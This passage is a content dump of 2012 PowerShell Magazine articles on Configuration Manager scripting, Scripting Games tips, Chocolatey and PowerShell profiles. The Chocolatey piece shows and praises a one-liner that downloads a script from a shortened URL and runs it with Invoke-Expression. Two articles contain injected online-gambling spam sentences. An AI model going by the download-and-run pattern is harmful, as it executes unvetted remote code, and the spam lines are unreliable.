aforementioned PowerEvents module.\nChallenges As with anything, there are certainly pitfalls to be aware of, especially as a developer. We’ll review a couple of these below.\nSite Control File In Configuration Manager 2007 and prior versions of the product, there was a concept known as the Site Control File (SCF). Each primary site has a SCF and stores most of the site-level configuration data, such as site boundaries, sender addresses, client agent configuration settings, site server roles, and so on. The SCF is quite challenging to work with in PowerShell, and as such, I would recommend sticking with VBscript or C# examples in the Configuration Manager SDK.\nLazy Properties We discussed lazy properties before, and how to retrieve them. Something you should concern yourself with, when working with classes that have lazy properties, is that changing and committing a WMI instance without first retrieving its lazy properties will effectively nullify the values of the lazy properties.\nWMI References In other WMI providers, associations between objects are often made using the CIM_REFERENCE type, which was mentioned in the earlier section on ConfigMgr-specific WMI features. This means that you won’t be able to use the “REFERENCES OF” or “ASSOCIATORS OF” WQL queries to discover objects that are related to a WMI class or specific instance in the ConfigMgr provider.\nConclusion In this article, we have reviewed the benefits of using Microsoft Windows PowerShell to automate the Microsoft System Center Configuration Manager product, and some of the things to watch out for. Through automation of ConfigMgr, you can achieve stronger, consistent management of your infrastructure, save yourself lots of time, perform governance audits, and run jobs on a schedule if necessary. I wish you the best in your scripting of ConfigMgr, and hope you can apply the concepts from this article practically going forward.\nFinally, feel free to reach out to me at pcgeek86@gmail.com if you have any questions regarding PowerShell, WMI, or System Center Configuration Manager. I would also recommend the MyITforum discussion forums and mailing lists to assist you with any ConfigMgr questions, as there is a very strong community there around this product.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/04/16/automating-configuration-manager-with-windows-powershell/","tags":["Configuration Manager"],"title":"Automating Configuration Manager with Windows PowerShell"},{"categories":["Learning PowerShell"],"contents":"I began a love affair with scripting eight years ago. Fairly new to IT, I took every training opportunity I could. One of the security guys I knew started a user group to teach Perl. He claimed he simply wanted to evangelize the joys of scripting but I think he was just really tired of writing scripts for everyone else.\nBack in 2002, Microsoft released a new scripting language called Monad. It was very similar to Perl so as Monad morphed into PowerShell, I quickly became a fan. I began using it for simple things; changing the local admin password on a group of servers, checking to see if a critical service was started on a set of servers. Every day I found a new way to use it. Over the years, I can’t tell you how many times I’ve used PowerShell to save the day.\nMany people question the value of scripting but I learned quickly that there are numerous benefits.\nYou can use PowerShell to:\n Easily query multiple systems for data Complete tasks quickly and consistently Execute repetitive tasks Perform a single step from the command line instead of eight steps in the GUI  In a large enterprise standardization is key to having a well-managed environment. PowerShell is one way to accomplish that uniformity.\nDNS: PowerShell helps solve a consistency problem with DNS servers. Several new DNS admins did not understand that creating a zone on the primary DNS server did not automatically create the zone on the secondary and tertiary servers. Tired of hearing about the lack of these zones causing problems, I wrote a PowerShell script. The script compared the zones on all three servers and if there were any inconsistencies, an email was sent, showing the missing zone and which server it was missing from.\nThe Registry: The introduction of Windows Server 2008 to our environment also introduced IPv6 which is enabled by default. The networking team reported a few issues with IPv6 packets crossing the routers. From Microsoft’s perspective, IPv6 is a mandatory part of the Windows operating system and should not be disabled, so that wasn’t an option. A joint call between Microsoft and Cisco determined that our course of action was to change a registry key on all the Windows 2008 servers. This key would disable IPv6 on all tunnel interfaces. Several different methods were discussed for accomplishing this. We determined that the quickest and easiest way was PowerShell. A simple six-line script solved a difficult problem within a matter of minutes. PowerShell to the rescue yet again\nFile Shares: PowerShell also saved the day about a year or so ago. There was a compliance gap at our company regarding share permissions on servers. The auditors were concerned that some application administrators, who had rights to log on to servers, could manipulate permissions on sensitive shares. There were hundreds of servers and thousands of shares involved. How could we possibly close that gap without lots of time and effort? PowerShell came to the rescue. Using just a few WMI classes, we were able to enumerate every share on the servers in question and add a group with restricted access to the shares. We then placed the application admins in the restricted group and viola, the compliance problem was solved.\nPowerShell has proved to be invaluable over and over again.\nPlease take the time to add this to your skill set. Don’t be intimidated. It’s a lot easier than it looks.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/28/powershell-the-great-problem-solver/","tags":["Learning PowerShell"],"title":"PowerShell: The Great Problem Solver"},{"categories":["Scripting Games"],"contents":"In the first part of this write-up we looked at five of the top ten learning points as we prepare for the scripting games this year, since games are really popular in all their different categories from programming games to even Casino games as the judi dadu online which is great for people wanting to make money online. We will continue by discussing remoting, error handling and outputting objects to the pipeline.\nSupport the enterprise Why do you want to automate if all you do is manage just one machine? Although you will certainly work more efficiently by automating repetitive tasks on a single server, the real power of PowerShell comes when you can send that single command to thousands of devices in the network and it performs just as well.\nThere are two basic ways of achieving this: The classic WMI, and the PowerShell V2 remoting. Several articles have been written at the Hey ScriptingGuy blog. Don Jones has an article in Technet magazine that explains this; while a full eBook dedicated to PowerShell remoting can be found at the powershell.com site, http://powershell.com/cs/media/p/4908.aspx, written by some of the top MVPs and is absolutely free.\nWriting a script that flexes its muscles in the ability to pipe in a list of devices from active directory and initiate a software install, or a thousand names from a CSV file to create accounts in active directory, or build a hundred VMs from data in a text file.\nManage the errors A splash of red on the PowerShell console is one of the most frustrating things in using PowerShell, especially after typing one of those long Exchange commands, and the message is not even the easiest to understand.\nPowerShell itself offers the ability to trap the error and:\n Write a more meaningful error message to the screen Write the error to a log file Write the error to event log  Errors are classified into two: terminating errors and non-terminating errors.\n Terminating errors will stop the script from running if it is encountered, and these could be syntax errors Non terminating errors would display the errors and continue executing the script.  Depending on how these are managed, meaning what error settings are used, or where we have written it to, these errors can turn out to the very useful in several ways. For example: Errors written to a log file can help in:\n Debugging the code Finding out what is happening in the network.  There are several Scripting Guys’ articles that can help you understand this better.\nLook for error handling resources in the following locations:\n http://blogs.technet.com/b/heyscriptingguy/archive/tags/error+handling/ http://blog.usepowershell.com/category/deep-dive/error-handling/ http://tfl09.blogspot.com/2009/01/error-handling-with-powershell.html http://outputredirection.blogspot.com/2010/04/powershells-trycatchfinally-and.html  Use native PowerShell commands Two articles in the Hey Scripting Guys blog brought my attention to this. In these articles Ed Wilson continues to stress the importance of considering native PowerShell commands first and only go for other options, like .NET classes, where there is no native PowerShell cmdlets to achieve a particular task, or where a native command does not offer the flexibility required in getting the desired result\nThese two articles are:\n Why Use .NET Framework Classes from Within PowerShell? – http://blogs.technet.com/b/heyscriptingguy/archive/2012/02/11/why-use-net-framework-classes-from-within-powershell.aspx Use .NET Framework Classes to Augment PowerShell when Required – http://blogs.technet.com/b/heyscriptingguy/archive/2012/02/12/use-net-framework-classes-to-augment-powershell-when-required.aspx  Output objects According to Don Jones: If you output pure text from a script or function, you’re doing it WRONG: http://www.windowsitpro.com/blog/powershell-with-a-purpose-blog-36/windows-powershell/powershell-part-12-139695\nMarco Shaw presents a good comparison of the two cmdlets – Write-Host and Write-Output. It goes a long way to explain that, although there are several instances where you’d want to write host, write output is still better at presenting output that persists in the pipeline. This article can be found here: http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/17/writing-output-with-powershell.aspx.\nThere are several ways to output objects. This TechNet article outlines some of the methods. http://technet.microsoft.com/en-us/magazine/hh750381.aspx. The choice really is yours and it all depends on your ultimate aim.\nAnother article by Steven Murawski continues on the same note: http://blogs.technet.com/b/heyscriptingguy/archive/2011/05/19/create-custom-objects-in-your-powershell-script.aspx\nThere is yet another post by Boe Prox on custom objects: http://learn-powershell.net/2012/03/02/working-with-custom-types-of-custom-objects-in-powershell/\nThis is no shortage of information on the net about creating objects and these can be used to strengthen one’s ability to generate outputs from scripts as the option of writing to host may not be a very viable one.\nAnswer the question ScriptingGuy emphasized during the PowerScripting podcast the importance of sticking the requirement of the event. You may actually lose points for presenting a long and complicated code that completely deviates from required solution.\nEach event, as scripting guy, explains has specific things it’s testing for. It is important to:\n Read the instruction carefully Understand what it specifies Utilize the simplest approach to solving the problem As much as possible focus on native PowerShell commands, unless there are none. If you require extra points – you may attempt to adjust your script to satisfy the extra conditions.  And that is final part of the write-up. Thanks for reading. I use this opportunity to wish everyone success in the scripting games 2012.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/22/my-10-best-practices-leading-to-the-scripting-games-2012-part-ii/","tags":["Scripting Games"],"title":"My 10 best practices leading to the Scripting Games 2012 – Part II"},{"categories":["Interviews"],"contents":"Courtesy of TrainSignal (a hat tip to Kasia Lorenc) we are presenting an interview with Ed Wilson conducted at TechEd NA 2011 in Atlanta.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/21/an-interview-with-microsofts-scripting-guy-ed-wilson-at-teched-na-2011/","tags":["Interviews"],"title":"An interview with Microsoft’s Scripting Guy, Ed Wilson at TechEd NA 2011"},{"categories":["How To","Scripting Games"],"contents":"I wrote an article earlier in the year about how I got inspired into PowerShell. The enthusiasm has made me consider entering for the scripting games, I even decided to visit site here to learn even more, if you are interested to learn how to play sbobet poker online game follow us. At the moment I can’t tell how ready I am but having started reading to prepare I have a few things I have come to understand as best practices towards having a successful participation.\nWhile it is possible for everyone to come out with that code that does something, there are several other factors that make one to stand out from the rest.\nI title this “10 best practices for the scripting games” since games are really popular including casino games such as situs judi slot online which is great for entertainment and is a game you can play online. I understand that there may be a lot more things to be aware of but the point here is not to attempt to highlight everything in PowerShell that needs to be addressed but to summarize my learning points into 10 handy notes while preparing, plus I know you are all trying to hurry so that you can play with slotsmummy.\nIn this two-part write-up I focus on the following:\n Annotate your script Accept input by pipeline Use CmdletBinding Use Comment Based Help Keep it simple (KISS) Support the enterprise Manage the errors Use native PowerShell commands Output objects Answer the question  Annotate your script One of the major reasons for participating in a competition like this is to be able to produce tools that will be useful at work. This means that either you will be using by yourself or giving out to colleagues to use. The code will always require to be reviewed, either to improve functionality, or to add more. It is important that when you pick up the code to review you know and understand exactly what the code was originally designed to do.\nLet your code outlive you. In your organization you will move to other roles and will not be managing codes anymore or out of the company. If someone, your successor, or colleague, or someone you mentor happens to review that code he should be able to do something with it.\nBelow is an example of an annotated in code that I have taken particular note of are these few lines taken from Jeff Hick’s MorningReport script.\nif($computername -eq $env:COMPUTERNAME) { #local computer so no ping test is necessary $OK=$True } elseIf(($ComputerName -ne $env:COMPUTERNAME) -AND (Test-Connection ` -ComputerName $ComputerName -Quiet -Count 2)) { #not local computer and it can be pinged so proceed $OK=$True } if($OK) { Try { $os = Get-WmiObject Win32_OperatingSystem -ComputerName ` $ComputerName -ErrorAction Stop #set a variable to indicate WMI can be reached $wmi=$True (...) The learning point for me here is how every line of code seems to have a statement explaining its purpose. Jeff Hicks has written on several aspect of PowerShell and his blog on jdhitsolutions.com/blog forms a great resource for both experienced PowerShell users, and beginners.\nAccept pipeline input The Scripting Guy in his last interview with PowerScripting podcast used the analogy of a mechanical tool he buys from a store to use. When you go to the store to buy this tool, you expect it to work straight out for the box. You have the object you want to use it on and you have expected results. It is completely unimportant to you at that moment what the tool is made of. Understandably if you are that savvy you want to know more about the specs, the physical makeup of the device, etc., but how many people really do that? The bottom line is that anyone taking that tool throws in his input and expects an output.\nWhenever we use native PowerShell cmdlets we take for granted that these will be able to take in a single input or a collection of inputs from the pipeline, process them, and produce results. And in most cases, they do. As for what the expected results should be, the section on outputting objects discusses this. However it is important to understand that some of the best scripts will sit in the middle while ingesting objects (or stings) from the pipeline and spitting objects as outputs to be used further down the pipeline – something similar to a factory process.\nPowerShell’s advanced function makes provision for this by providing the “accepts input by pipeline” option in the param block. Utilizing this contributes to producing a function that behaves like a native cmdlets.\nA good article online is http://www.windowsitpro.com/print/scripting/Handling-Input-in-PowerShell-Functions by Bill Stewart.\nUse CmdletBinding Attribute By definition, CmdletBinding “declares a function that acts similar to a compiled cmdlet”.\nOne of the greatest attributes of PowerShell is the consistency in structure. It just makes sense that whenever we write our scripts we attempt to make them look and feel and act as close to native cmdlets as possible, as already discussed in the previous section.\nCmdletBinding automatically provides the function with parameters like –Verbose, -Debug, -ErrorVariable, -ErrorAction commonly called as common parameters.\nRead “What does PowerShell’s [CmdletBinding()] Do? “: http://www.windowsitpro.com/blog/powershell-with-a-purpose-blog-36/windows-powershell/powershells-[cmdletbinding]-142114 to further understand this.\nYou may wish to read the online help\n http://msdn.microsoft.com/en-us/library/dd347560 http://technet.microsoft.com/en-us/library/dd315326.aspx  In addition, including “ShouldProcess” and setting that to $true gives us the ability to include -WhatIf and -Confirm to our script.\nUse comment-based help There is a difference between the comments you write in the script as annotations and comment-based help used for developing the help text for your script. While the ordinary comments, with‘#’ at the beginning of a new-line is used to help you or any other person reading the code in the future, comment based help extends this to actually providing a help file for your function..\nIn its most basic form http://powershell.com/cs/blogs/tips/archive/2009/11/06/using-comment-based-help.aspx is an excellent place to start.\nJeff Hicks wrote a wonderful article on his blog about a year ago and it can be found here. http://jdhitsolutions.com/blog/2011/03/new-comment-help/\nIf you are not comfortable with answering a series of read-host questions to build your help file you can use ScriptingGuy’s Add-help function here: http://blogs.technet.com/b/heyscriptingguy/archive/2010/09/11/automatically-add-comment-based-help-to-your-powershell-scripts.aspx\nOr if you good at reading, you can as well read through: http://technet.microsoft.com/en-us/library/dd819489.aspx\nAgain including this in you script ensures allows people to use get-help to understand how the script works and how it can be used – further making the script to behave like a native cmdlet.\nKeep it simple (KISS) The most efficient codes are not necessarily the most complex. On the contrary when the code is simple and straightforward, it is easier to read, execute, and review; it also runs more efficiently, etc.\nI came across the following two codes while looking for a simple solution – number of mailboxes per database.\nSolution A:\nGet-Mailbox | Group-Object -Property Database | Select-Object Name, Count Solution B:\nGet-MailboxDatabase | Select-Object Name, ` @{Name=\u0026#34;Count\u0026#34;;Expression={(Get-Mailbox -Database $_.Identity | Measure-Object ` ).Count}}} (Please note that original code has been modified to provide the desired results.)\nThese two codes give same results. I decided to pass them through a Measure-Command just for the fun of it and the result was interesting:\nSolution A came out in 1.75s:\nPS\u0026gt; Measure-Command {Get-Mailbox | Group-Object -Property Database | ` Select-Object Name, Count} Days : 0 Hours : 0 Minutes : 0 Seconds : 1 Milliseconds : 747 Ticks : 17472628 TotalDays : 2.02229490740741E-05 TotalHours : 0.000485350777777778 TotalMinutes : 0.0291210466666667 TotalSeconds : 1.7472628 TotalMilliseconds : 1747.2628 Solution B took 3.02s\nPS\u0026gt; Measure-Command {Get-MailboxDatabase | Select-Object Name, ` @{Name=\u0026#34;Count\u0026#34;;expression={(Get-Mailbox -Database $_.Identity | ` Measure-Object).Count}}} Days : 0 Hours : 0 Minutes : 0 Seconds : 3 Milliseconds : 20 Ticks : 30205752 TotalDays : 3.49603611111111E-05 TotalHours : 0.000839048666666667 TotalMinutes : 0.05034292 TotalSeconds : 3.0205752 TotalMilliseconds : 3020.5752 This was carried out in an environment with about 200 mailboxes. I can only imaging the impact of this in an environment of 10,000 mailboxes.\nThis concludes the first part of this write-up. Please come back for the second and concluding part as we discuss remoting, error handling and objects.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/20/my-10-best-practices-leading-to-the-scripting-games-2012-part-i/","tags":["Scripting Games","How To"],"title":"My 10 best practices leading to the Scripting Games 2012 – Part I"},{"categories":["Interviews"],"contents":"Courtesy of TrainSignal (a hat tip to Kasia Lorenc) we are presenting an interview with Hal Rottenberg conducted at TechEd NA 2011 in Atlanta.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/19/an-interview-with-powershell-mvp-hal-rottenberg-at-teched-na-2011/","tags":["Interviews"],"title":"An interview with PowerShell MVP Hal Rottenberg at TechEd NA 2011"},{"categories":["News"],"contents":"The pre-release version of Microsoft’s Script Explorer for Windows PowerShell Beta 1 has been released. Download it HERE.\nScript Explorer Beta 1 is a free download and an extension of the content and guidance experience that combines the vast amount of knowledge held in the community with the resources available today from Microsoft. With Script Exploer you’ll be able to:\n· Search online repositories such as PoshCode and Technet\n· Establish and search local and corporate script repositories\n· Filter search by location and product relevance\n· Browse Community Resources, such as TechNet Wiki\n· Seamlessly integrate community samples into corporate script library\nWant to as a question or provide feedback on Script Explorer? Visit the online forums at: http://social.technet.microsoft.com/Forums/en-US/scriptexplorer\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/13/microsoft-script-explorer-for-windows-powershell/","tags":["News"],"title":"Microsoft Script Explorer for Windows PowerShell"},{"categories":["Learning PowerShell"],"contents":"So, finally I’m getting around to write down how I plunged into PowerShell scripting…\nFirst of all, I’ll begin with my core statement for those who are still reluctant to learn PowerShell: don’t hesitate anymore! Once you’ve started using PowerShell you’ll realize that there was absolutely no reason to worry about. What’s more: “Worrying is like a rocking chair. It gives you something to do, but it doesn’t get you anywhere.” (Party Animals http://www.imdb.com/title/tt0283111/)\nI must admit though that I’m one of those guys who actually DID hesitate. During the 90’s (as a Novell NetWare Administrator) I learned to get the most out of Batch files, and about ten years later (as a Systems Engineer and Consultant) I mainly used VBScript or a mix of VBScript and Batch. Once PowerShell v1 came out with Exchange 2007 I realized that this command-line and automation platform is a huge step in the right direction. With the first release of PowerShell Microsoft finally addressed the fact that an improvement had long been overdue. But… old habits die hard, am I right or am I right? 😉 For a period of roughly one year I found myself reverting back to the old ways on almost every occasion.\nTo cut a long story short, I did my first serious steps in PowerShell in course of a huge automation project in late 2008. The most important part of the commissioned work was the composition of a PowerShell-based IT process automation framework to build and manage a multi-tenant Citrix XenApp farm on top of the freshly baked releases of Windows Server 2008, Hyper-V, and SCCM. At the end of the day it was one of the easier tasks in this project to learn PowerShell. Moreover it would have been even harder to build that solution without PowerShell. From a present-day perspective I wish back then we had the features of PowerShell v3 or at least v2…\nGo for it! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/07/old-habits-die-hard/","tags":["Learning PowerShell"],"title":"Old Habits Die Hard"},{"categories":["News"],"contents":"Beginning on Monday, March 12, 2012, Ed Wilson, The Scripting Guy, will start a new series of Learn Windows PowerShell Live Meetings titled “Windows PowerShell for the Busy Admin”. You need to sign up now to ensure that there will be a slot for you to attend these free meetings. Sessions will be recorded and available at the TechNet Script Center Learn PowerShell page.\nSession 1: PowerShell SmowerShell or: Why Bother to Learn Windows PowerShell\nIn this session, Microsoft Scripting Guy ,Ed Wilson, discusses the fact that in addition to being the management future for Microsoft products, Windows PowerShell offers a number of compelling reasons for learning it. These reasons include the following: it is powerful and provides the ability to collect and to consolidate information from multiple remote systems into a centralized view of the data. It is safer than many other tools, and offers the ability to prototype a command prior to the command execution. There is also a confirmation mode that will allow a network administrator or other IT Pro the ability to selectively step through a group of commands to cherry pick commands to execute or ignore. Windows PowerShell also has built in logging that provides documentation of not only what commands are executed, but the resultant output from those commands. In addition, Windows PowerShell contains numerous features to promote a high level of discoverability and intuitive usability. This session is heavy with practical tips and demonstrations.\nSession 2: Heard It Through the Pipeline or: How to Compound PowerShell Commands for Fun and Profit\nOne of the most basic and one of the most powerful features of Windows PowerShell is the pipeline. By using the Windows PowerShell pipeline, one can take a basic set of cmdlets and build a nearly infinite assortment of useful commands. And yet, all of this boils down to using the pipeline to perform essentially four types of activities. The first is to use the pipeline to retrieve items and to work on them. The second is to use the pipeline to filter out data. The third basic use of the pipeline is to persist information. Lastly, the use of the pipeline to format output. In this session, all four basic uses of the pipeline are covered with a heavy dose of demos.\nSession 3: Sole Provider? Not Hardly or: A Look at Windows PowerShell Providers\nOne of the revolutionary concepts in Windows PowerShell is the idea of PowerShell providers. Windows PowerShell providers provide a singular way to access different types of data that are stored in different locations. Default providers include a file system, registry, alias, variable, function, and environmental variable. This means that one can use Get-Item to access content stored in any of these locations. Not only that, but these providers are extensible, which means that Microsoft teams (and non-Microsoft developers) can create additional providers.\nSession 4: The Main Event or: PowerShell Does Event Logs\nRegardless of one’s position, it seems that at some point or another everyone will be involved in looking at event logs. And why not…especially since Windows has such great logging support. Whether it is for security reasons, troubleshooting reasons, or general Windows health monitoring, the logs contain nearly all of the required information one seeks. In this session, Microsoft Scripting Guy, Ed Wilson, discusses the classic and the newer ETW style of logs, and looks at the tools that are used with each type of log.\nSession 5: More than Remotely Possible or: Using PowerShell to Manage the Remote Desktop\nLet’s face it, even though there are lots of commercial products out there that assist in managing desktops,or servers, most are very complex, and they require a dedicated support team to manage them. Even in organizations where such tools exist, the teams agenda, and the front-line admin’s agenda often clash. For adhoc situations, using Windows PowerShell to manage remote machines fills-in the gray area. In this session, Microsoft Scripting Guy, Ed Wilson,discusses using Windows PowerShell to manage remote machines.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/07/windows-powershell-for-the-busy-admin/","tags":["Scripting Games","News"],"title":"Windows PowerShell for the Busy Admin"},{"categories":["News"],"contents":"Windows Management Framework 3.0 – Beta is available for download. Get it HERE. More information on the PowerShell team blog.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/03/01/powershell-3-0-beta-is-out/","tags":["News"],"title":"PowerShell 3.0 Beta is out"},{"categories":["Package Management"],"contents":"In the first installment we covered installing both a tool and an application. If the possibilities of Chocolatey have not yet started to solidify for you, hopefully this next segment will.\nStay Up to Date Chocolatey allows you to keep up to date with the update command. Do you remember how simple the command for install was from the last segment? Update is just as simple. You can run this with either ‘chocolatey update’ or ‘cup’ for short.\nPS\u0026gt; chocolatey update somePackageName One Update to Rule Them All Let’s not forget the update command to rule them all. Think of it like windows update, but for everything else. This will update every package you have installed on your machine!\nPS\u0026gt; cup all Machine Environment Setup Another possible scenario where Chocolatey and PowerShell can shine is surrounding a developer set up environment for hacking. When you pull down source code from time to time you will see notes that people have included to tell possible contributors what they need to do to set up the “environment.” Using Chocolatey and some PowerShell you can script that out and install everything they need without having to use some advanced code. For instance, take a look at nuserve on github. You run setup.cmd and it executes a PowerShell script that installs Chocolatey, NuGet, Ruby, DevKit, updates Gems, installs bundler, and then runs the builds. If you don’t think that is a powerful idea, consider that the author of nuserve, David Alpert, said the script was “all scripted to a one-liner. Genius.” For a second imagine having someone pull down your source and firm up any development discrepancies automatically before they even begin. They didn’t even have to read your readme.\nUnder the Hood Chocolatey uses some ingenuity with PowerShell on top of the already existing NuGet. It itself is about 500 lines of PowerShell code. I am not an expert at PowerShell, just someone who wanted to learn more about the language and hope that it sticks this time. Every time I use PS, I later forget almost everything I’ve learned. PowerShell is very powerful in what it can do – consider that you can actually put PowerShell text on the internet somewhere and run Invoke-Expression after literally downloading it to run a set of PowerShell commands. That’s really powerful when you think about it. The Chocolatey one line install takes advantage of that:\nPS\u0026gt; Invoke-Expression ((New-Object Net.WebClient).DownloadString(\u0026#39;http://bit.ly/psChocInstall\u0026#39;)) Chocolatey puts some batch files on the path that call PowerShell and run the Chocolatey script, passing along the arguments. When Chocolatey runs, it uses NuGet to download packages and work on dependency resolution. Then it searches for and executes the chocolateyInstall.ps1 script if it finds it. It generates a runtime of PowerShell, importing helper modules for the script to use when executing. This allows the script to be very brief (more on this in Creating Packages).\nIt also looks for executables in the package folder, either there with the package or brought in during the execution of the chocolateyInstall script. When it finds these executables, it creates a batch command reference in a folder on the path so the commands are now available.\nChocolatey takes advantage of PowerShell’s ability to override commands. When you create packages and you call Write-Host or Write-Error, Chocolatey leverages that to note the information in a log before calling the underlying command. It really leverages the concept of Splatting to do this.\nfunction Write-Host { param( [Parameter(Position=0,ValueFromPipeline=$true)][object]$Object, [Parameter()][switch] $NoNewLine, [Parameter()][ConsoleColor] $ForegroundColor, [Parameter()][ConsoleColor] $BackgroundColor, [Parameter()][Object] $Separator ) $chocoPath = Split-Path -Parent $helpersPath $chocoInstallLog = Join-Path $chocoPath \u0026#39;chocolateyPSInstall.log\u0026#39; $Object | Out-File -FilePath $chocoInstallLog -Force -Append $oc = Get-Command Write-Host -Module Microsoft.PowerShell.Utility \u0026amp; $oc @PSBoundParameters } Notice in the command above how I grab the original command and then pass all of the parameters to it from my function with @PSBoundParameters? It takes my $PSBoundParameters variable and passes it to the function I am calling as parameters. This is great because it saves a lot of branching.\nCreating Packages Remember how we first talked about how easy Chocolatey is to use? Creating packages is simple, too. You can literally create a package to install a full application with a nuspec (NuGet package specifications xml file) and a chocolateyInstall.ps1 file. The nuspec containing the information about the package will take you longer to gather and fill out compared to the time it’ll take you to prepare the download and install of an MSI in the chocolateyInstall.ps1 file. Chocolatey comes with helpers (https://github.com/chocolatey/chocolatey/wiki/HelpersReference) to shorten the work necessary in the chocolateyInstaller.ps1 file.\nImagine in your mind what it would take to download a file from a known location and then run in administrative mode to install it silently. Have you got a picture of that now? Now here’s how you install StExBar:\nPS\u0026gt; Install-ChocolateyPackage \u0026#39;StExBar\u0026#39; \u0026#39;msi\u0026#39; \u0026#39;/quiet\u0026#39; \u0026#39;http://stexbar.googlecode.com/files/StExBar-1.8.3.msi\u0026#39; \u0026#39;http://stexbar.googlecode.com/files/StExBar64-1.8.3.msi\u0026#39; Notice the two urls? The optional second one is for 64bit if the application supports that. If there is not a 64bit version, just leave out the second url and Chocolatey handles it.\nVideos There is a short video on YouTube demonstrating how easy it is to create a package. I create one for the WinDirStat\u0026rsquo;s package. http://www.youtube.com/watch?v=Wt_unjS_SUo. You can also take a look at the wiki for a more in depth explanation.\nConclusion Chocolatey is young, has very powerful concepts and a community that is rapidly growing. PowerShell drives it, giving Chocolatey the ability to quickly adapt to meet many needs. Plus, it uses NuGet as the packaging system, which brings the advantages of a packaging system that came before. Chocolatey supports an existing infrastructure of native installers and decentralized distributions using a centralized point of instructions. And because the chocolateyInstall.ps1 instructions are just PowerShell, they can be about virtually anything, not necessarily a call to download and install an MSI. Think of Chocolatey as a global automation tool for Windows.\nThis is not the first time someone has tried to bring the ideas of apt-get to Windows and it won’t be the last. Chocolatey has a good chance of succeeding where others have failed because simplicity is at its core. Chocolatey is simple to use, simple to create packages, and super simple to maintain packages. The bar to entry is low because it builds on already familiar ideas and it leverages things that are already available with Windows.\nLet’s get Chocolatey!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/02/20/chocolatey-and-powershell-revolutionize-windows-part-ii/","tags":["Chocolatey","Package Management"],"title":"Chocolatey and PowerShell – Revolutionize Windows, Part II"},{"categories":["Package Management"],"contents":"Ten years ago we did things a certain way. Five years ago we thought the things we did ten years ago were antiquated. Tomorrow you will wonder how you ever used Windows without PowerShell and Chocolatey.\nBold statements? Perhaps. Let’s think about a scenario for a moment. You run an open source project and for someone to hack on your project, they need to have Ruby, Ruby’s DevKit and NuGet installed. That’s kind of a large barrier to entry. What if there was a project out there where you could run one command and it would completely set up the development environment with all the tools you needed to hack on that project?\nShift for a second. What if there was a place that was like an app store that had free/open source tools and applications for Windows? What if installing these apps/tools was one line of code? What if I could have packages that have dependencies on multiple tools?\nWhat if this already exists today? Do I have your attention? Let’s talk about what Chocolatey (http://chocolatey.org) brings to the table. Chocolatey is an enabler. It enables you to get tools, to subscribe to the idea of global silent application installers, and to enable easier collaboration with others on windows. Chocolatey is a machine package manager that is kind of like apt–get with a Windows flavor.\nIf you are unfamiliar with apt (AdvancedPackageTool), it is the concept of software, configuration, components, everything (including the Linux kernel in Debian), built into packages that you can install on a Linux machine. Apt handles retrieval, configuration, installation and updating of software packages.\nLet’s explore the concepts of Chocolatey and how it can shift your thinking about what’s possible with Windows.\nTools Enabler Chocolatey, like RubyGems, will allow people to include executables in their packages. Ruby Gems, if you are unfamiliar, are software packages that contain a library or application. The application gems are synonymous with what I will describe as “tools” because they are brought to your system, but they are not “installed” to windows.\nIf you include an executable in a package or download one to the package folder at runtime, Chocolatey will set up a batch command file on the path that links to that executable so that it can be called from anywhere on the system. Let’s say I want to install something like StatLight, which is a tool for testing Silverlight applications. The NuGet package literally has the executable in it, so all I need to run is (Note: all Chocolatey commands can be run without PowerShell thus why they don’t look like PowerShell verbs):\nPS \\\u0026gt; chocolatey install statlight It picks up the StatLight executable in the package and links to it, so I can run:\nPS \\\u0026gt; statlight The command redirects me to the actual statlight.exe and allows me to use the tool.\nGlobal Silent Application Installer At one point or another you may have worked with the concept of keeping a set of installers and MSIs on some company drive with silent install batches so that you could set your machine up. You were stuck to that version. When I started working on chocolatey, I had a couple of years’ experience working on making silent installers at two companies. The biggest roadblocks were keeping all of these applications up to date. Worse still, making sure everyone was on a standard version after you updated the package.\nChocolatey solves both of these problems because it never requires you to download these items ahead of time and it makes updating as easy as installing. To install an application like msysGit I just need to type:\nPS \\\u0026gt; cinst msysgit Press enter and wait for it to finish. When it completes, msysGit is installed on my machine. It downloads the MSI from the distribution source and invokes a silent install on it.\nThat’s part one, in the next segment we’ll cover updates, setting up a development environment from source and creating packages.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/02/15/chocolatey-and-powershell-revolutionize-windows-part-i/","tags":["Chocolatey","Package Management"],"title":"Chocolatey and PowerShell – Revolutionize Windows, Part I"},{"categories":["How To"],"contents":"One characteristic of effective shell users is that they modify their environment in ways that makes them as efficient as possible. This concept is standard Unix-fu and now that PowerShell has introduced us to customizable profiles, we can enjoy the same luxury.\nThere are already great resources about PowerShell Profiles so I’m not going to repeat those details here. If you are curious about how profiles are implemented, then I recommend reading Lee Holmes\u0026rsquo; post on some of the history behind the decision making.\nThe purpose of this article is to show you some of the things that you can do with a customized profile. I hope it inspires you to create your own and make it available for everyone to learn from. Here are a few things I have my profile doing for me:\nPowerShell Module auto-loader PS\u0026gt; Get-Module -ListAvailable | Where-Object { $_.ModuleType -eq \u0026#34;Script\u0026#34; } | Import-Module PowerShell modules are self-contained set of scripts that expose public functions as their interface. When modules are installed in one of your $env:PSModulePath locations, you can import them by name using Import-Module. By default PowerShell doesn’t import any modules. I find this a bit irritating because I want modules that I install to be available to me whenever I’m in PowerShell. I’m probably influenced by Ruby and RubyGems here.\nSince I haven’t found a reason why I wouldn’t want all my PowerShell modules loaded by default, I have a simple function that finds all script modules installed and imports them right way. The module I use frequently is 